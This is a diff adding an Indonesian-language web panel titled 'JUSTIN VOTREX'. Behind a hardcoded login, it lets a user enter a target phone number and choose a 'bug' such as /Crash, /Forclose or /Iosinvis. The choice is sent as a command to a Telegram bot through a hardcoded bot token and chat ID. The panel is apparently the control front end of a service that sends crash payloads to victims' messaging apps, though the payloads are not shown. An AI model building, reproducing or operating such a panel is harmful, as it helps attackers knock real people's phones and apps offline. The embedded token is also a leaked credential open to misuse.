@@ -1,0 +1,187 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>JUSTIN VOTREX</title>
+  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@500&family=Roboto&display=swap" rel="stylesheet">
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body {
+      font-family: 'Roboto', sans-serif;
+      background: linear-gradient(135deg, #0f0f0f, #1c0000);
+      background-size: 400% 400%;
+      animation: gradientFlow 10s ease infinite;
+      color: white;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      padding-top: 80px;
+    }
+    @keyframes gradientFlow {
+      0% { background-position: 0% 50%; }
+      50% { background-position: 100% 50%; }
+      100% { background-position: 0% 50%; }
+    }
+    .top-bar {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      padding: 15px 25px;
+      background: rgba(255, 0, 0, 0.8);
+      backdrop-filter: blur(5px);
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      font-family: 'Orbitron', sans-serif;
+      font-size: 18px;
+      color: white;
+      box-shadow: 0 0 10px red;
+      z-index: 999;
+    }
+    .top-bar .close {
+      cursor: pointer;
+      font-size: 22px;
+    }
+    .card {
+      background: rgba(255, 255, 255, 0.05);
+      border: 1px solid rgba(255, 0, 0, 0.4);
+      padding: 30px 20px;
+      border-radius: 20px;
+      width: 90%;
+      max-width: 400px;
+      box-shadow: 0 0 20px rgba(255, 0, 0, 0.2);
+      backdrop-filter: blur(15px);
+      transition: 0.4s;
+      animation: fadeIn 0.8s ease;
+    }
+    h1 {
+      text-align: center;
+      margin-bottom: 25px;
+      color: #ff4d4d;
+      font-size: 26px;
+      font-weight: bold;
+      letter-spacing: 1px;
+    }
+    input, select {
+      width: 100%;
+      padding: 14px;
+      margin: 10px 0;
+      border: 1px solid rgba(255, 255, 255, 0.3);
+      border-radius: 10px;
+      background-color: rgba(0, 0, 0, 0.4);
+      color: white;
+      font-size: 15px;
+      outline: none;
+    }
+    input:focus, select:focus { border-color: #ff4d4d; }
+    button {
+      width: 100%;
+      padding: 14px;
+      margin-top: 15px;
+      background: linear-gradient(to right, #ff1a1a, #cc0000);
+      color: white;
+      font-weight: bold;
+      border: none;
+      border-radius: 10px;
+      font-size: 16px;
+      cursor: pointer;
+      transition: transform 0.2s, background 0.3s;
+    }
+    button:hover {
+      transform: scale(1.03);
+      background: linear-gradient(to right, #cc0000, #990000);
+    }
+    #bug-section { display: none; }
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(30px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+    @media screen and (max-width: 480px) {
+      .top-bar { font-size: 16px; }
+    }
+  </style>
+</head>
+<body>
+  <audio autoplay loop hidden>
+    <source src="https://files.catbox.moe/tg5065.mp3" type="audio/mpeg">
+    Browser tidak mendukung audio.
+  </audio>
+  <div class="top-bar">
+    <div>JUSTIN VOTREX</div>
+    <div class="close" onclick="goBackToLogin()">✖</div>
+  </div>
+
+  <div class="card" id="login-section">
+    <h1>Login</h1>
+    <input type="text" id="username" placeholder="Masukkan Username" />
+    <input type="password" id="key" placeholder="Masukkan Key Akses" />
+    <button onclick="login()">LOGIN</button>
+  </div>
+
+  <div class="card" id="bug-section">
+    <h1>Kirim Bug</h1>
+    <input type="text" id="target" placeholder="Nomor Target 62XXX" maxlength="15"/>
+    <select id="bugType">
+      <option value="/Forclose">/Forclose</option>
+      <option value="/Crash">/Crash</option>
+      <option value="/Invisdelay">/Invisdelay</option>
+      <option value="/Combo">/Combo</option>
+      <option value="/Fcinvis">/Fcinvis</option>
+      <option value="/Justingc">/Justingc</option>
+      <option value="/Iosinvis">/Iosinvis</option>
+    </select>
+    <button onclick="sendBug()">SEND BUG</button>
+  </div>
+
+  <script>
+    const TELEGRAM_BOT_TOKEN = '7342366559:AAFIpd4Y5mwz5oi6c6sOEkxagnzbuvVPfFI';
+    const TELEGRAM_CHAT_ID = '-1002871908326';
+
+    function login() {
+      const username = document.getElementById("username").value.trim();
+      const key = document.getElementById("key").value.trim();
+      if (username === "JUSTIN" && key === "V20") {
+        document.getElementById("login-section").style.display = "none";
+        document.getElementById("bug-section").style.display = "block";
+      } else {
+        alert("Username atau Key salah!");
+      }
+    }
+
+    function goBackToLogin() {
+      document.getElementById("login-section").style.display = "block";
+      document.getElementById("bug-section").style.display = "none";
+    }
+
+    function sendBug() {
+      const nomor = document.getElementById("target").value.trim();
+      const bug = document.getElementById("bugType").value;
+      if (nomor === "" || !nomor.startsWith("62")) {
+        alert("Masukkan nomor dengan format 62XXX!");
+        return;
+      }
+      const pesan = `${bug} ${nomor}`;
+      fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: pesan })
+      })
+      .then(response => response.json())
+      .then(data => {
+        if (data.ok) {
+          alert("Bug berhasil dikirim ke Telegram!");
+        } else {
+          alert("Gagal mengirim ke Telegram.");
+        }
+      })
+      .catch(error => {
+        alert("Terjadi kesalahan: " + error);
+      });
+    }
+  </script>
+</body>
+</html>
